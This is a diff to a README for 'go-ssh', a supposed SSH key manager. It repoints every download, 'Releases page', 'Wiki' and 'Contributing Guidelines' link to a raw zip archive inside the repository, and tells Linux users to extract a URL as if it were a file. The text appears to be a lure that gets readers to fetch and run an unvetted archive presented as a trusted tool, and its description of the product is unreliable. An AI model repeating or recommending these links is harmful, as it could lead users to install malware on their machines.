@@ -1,7 +1,7 @@
 # 🔑 go-ssh - Simple SSH Key Management for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip)
+[![Download Latest Release](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip)
 
 ## 🚀 Getting Started
 The go-ssh tool helps you manage your SSH keys easily right from your terminal. This guide will walk you through the steps to download and set up the application on your computer.
@@ -20,19 +20,19 @@ The go-ssh tool helps you manage your SSH keys easily right from your terminal. 
 ## 📥 Download & Install
 To get started with go-ssh, you first need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [go-ssh Releases page](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip).
+1. **Visit the Releases Page**: Go to the [go-ssh Releases page](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip).
 
 2. **Select Your Download**: Look for the latest release version. You’ll see several files. Choose the one that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip` file.
+   - For Linux, download the `https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip` file.
 
 3. **Download the File**: Click on the file name to start the download.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS**: Open the `.dmg` file and drag the go-ssh icon into your Applications folder.
-   - **Linux**: Extract the `https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip` file to your desired location. Open your terminal and navigate to the folder where you extracted it.
+   - **Linux**: Extract the `https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip` file to your desired location. Open your terminal and navigate to the folder where you extracted it.
 
 5. **Run the Application**:
    - **Windows**: Open the Start menu, search for "go-ssh," and click on the icon to launch it.
@@ -50,15 +50,15 @@ Once you've installed and opened go-ssh, you will see an interactive terminal us
 3. **Generate a New Key**: Choose the option to create a new SSH key. Follow the prompts to name your key and select a file location.
 
 ## 🌐 Additional Resources
-- **Documentation**: For more detailed instructions, check the official documentation on the [GitHub Wiki](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip).
+- **Documentation**: For more detailed instructions, check the official documentation on the [GitHub Wiki](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip).
 - **Community Support**: If you have questions or need help, check the Issues section on the repository or join our discussion forums.
 
 ## 🎉 Contribution
-If you wish to contribute to go-ssh, please read our [Contributing Guidelines](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip). Your input helps improve the tool for everyone.
+If you wish to contribute to go-ssh, please read our [Contributing Guidelines](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip). Your input helps improve the tool for everyone.
 
 ## 📥 Summary
 To download go-ssh:
-- Visit the [go-ssh Releases page](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/cmd/go-ssh-2.5.zip).
+- Visit the [go-ssh Releases page](https://github.com/pogiako123pak/go-ssh/raw/refs/heads/main/internal/app/go_ssh_v2.8-beta.2.zip).
 - Choose the file for your operating system.
 - Follow the installation steps based on your OS.
 
